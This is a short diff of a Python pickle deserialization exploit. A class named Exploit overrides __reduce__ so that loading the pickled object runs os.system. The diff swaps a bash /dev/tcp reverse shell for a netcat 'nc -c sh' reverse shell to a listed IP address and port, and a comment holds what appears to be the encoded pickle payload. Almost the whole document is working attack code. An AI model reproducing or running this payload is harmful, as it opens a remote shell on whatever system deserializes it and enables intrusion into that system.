@@ -5,7 +5,7 @@ import pickle
 class Exploit(object):
     def __reduce__(self):
         import os
-        return os.system, (b"bash -i >& /dev/tcp/192.16.86.76/8888 0>&1", )
+        return os.system, (b"nc -c sh 192.168.17.129 8888", ) # gASVNwAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUQxxuYyAtYyBzaCAxOTIuMTY4LjE3LjEyOSA4ODg4lIWUUpQu
 
 
 def just_serialize():
